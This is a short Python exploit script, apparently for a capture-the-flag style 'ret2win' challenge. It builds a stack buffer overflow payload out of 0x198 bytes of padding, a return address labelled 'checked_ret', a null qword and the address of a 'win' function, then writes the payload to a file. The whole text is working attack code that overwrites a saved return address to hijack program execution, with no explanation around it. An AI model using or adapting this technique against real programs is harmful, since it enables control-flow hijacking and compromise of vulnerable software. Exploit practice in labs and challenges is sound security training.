import struct

win = struct.pack("<Q", 0x4012e9)

buf = b'A' * (0x190 + 8)

checked_ret = struct.pack("<Q", 0x401465)

payload = buf + checked_ret + struct.pack("<Q", 0x0) + win

with open('payload', 'wb') as f:
    f.write(bytearray(payload))
